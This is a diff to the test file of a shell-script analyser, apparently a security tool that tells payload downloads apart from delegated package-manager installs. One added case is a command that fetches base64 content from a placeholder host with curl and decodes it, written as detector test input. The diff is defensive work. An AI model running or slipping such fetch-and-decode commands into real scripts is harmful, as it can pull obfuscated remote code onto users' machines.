@@ -72,6 +72,7 @@ describe("what a fetch's response is used for", () => {
     ["handed to pnpm as a gitlab: spec", "pnpm add -g gitlab:owner/repo"],
     ["handed to yarn as a bitbucket: spec", "yarn global add bitbucket:owner/repo"],
     ["handed to bun as a gist: spec", "bun add -g gist:abc123"],
+    ["captured through an unrecognised consumer", 'X="$(curl -fsSL https://x.example/b64 | base64 -d)"'],
   ])("treats a fetch %s as a payload", (_, script) => {
     const a = analyseShell(`#!/bin/sh\n${script}\n`);
     expect(a.payloadDownloads.length).toBeGreaterThan(0);
@@ -100,6 +101,12 @@ describe("what a fetch's response is used for", () => {
     ["brew install some-cli", "brew"],
     ["sudo npm install --global some-cli", "npm"],
     ["npm install -g @scope/some-cli@1.2.3", "npm"],
+    ["npm install -g some-cli > logs/npm.log", "npm"],
+    ["npm install --prefix vendor/tool some-cli", "npm"],
+    ["npm install --prefix=vendor/tool some-cli", "npm"],
+    ["npm install --prefix ./lib some-cli", "npm"],
+    ["yarn --cwd packages/app add some-cli", "yarn"],
+    ["pnpm -C apps/web add some-cli", "pnpm"],
   ])("recognises `%s` as delegated to %s", (script, manager) => {
     const a = analyseShell(`#!/bin/sh\n${script}\n`);
     expect(a.delegatedInstalls.map((d) => d.manager)).toEqual([manager]);
